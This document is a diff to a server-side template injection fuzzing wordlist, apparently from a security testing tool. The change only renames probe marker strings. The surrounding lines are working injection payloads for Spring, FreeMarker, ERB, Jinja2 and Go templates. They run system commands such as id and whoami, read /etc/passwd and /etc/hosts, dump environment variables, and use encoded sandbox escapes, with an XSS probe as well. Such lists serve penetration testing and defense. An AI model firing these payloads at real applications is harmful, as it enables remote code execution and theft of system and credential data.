@@ -8,18 +8,17 @@ ${T(java.lang.Runtime).getRuntime().exec('cat etc/hosts')}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(java.lang.System).getenv()}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
-${foobar}
-${fuzzer}
+${ElectricYellow}
 ${{3*3}}
 ${{7*7}}
 ${{<%[%'"}}%\.,
-${{fuzzer}}
+${{ElectricYellow}}
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 <%= 3 * 3 %>
 <%= 7*7 %>
 <%= File.open('/etc/hosts').read %>
 <%= File.open('/etc/passwd').read %>
-<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"ElectricYellow
 @(6+5)
 XXXX${{<%[%'"}}%\.XXXX
 YYYY${{<%[%'"}}%\YYYY
@@ -53,8 +52,7 @@ a'a\'b"c>?>%}}%%>c<[[?${{%}}cake\
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
-{{'a'.toUpperCase()}} 
-{{'electric_yellow'.toUpperCase()}}
+{{'ElectricYellow'.toUpperCase()}} 
 {{.Email}}
 {{.Id}}
 {{.Password}}
@@ -73,10 +71,10 @@ a'a\'b"c>?>%}}%%>c<[[?${{%}}cake\
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 {{config.items()}}
 {{dump(app)}}
-{{fuzzer}}
-{{html "ssti"}}
-{{js "ssti"}}
-{{printf "electric_yellow"}}
+{{ElectricYellow}}
+{{html "ElectricYellow"}}
+{{js "ElectricYellow"}}
+{{printf "ElectricYellow"}}
 {{request.__class__}}
 {{request|attr("__class__")}}
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
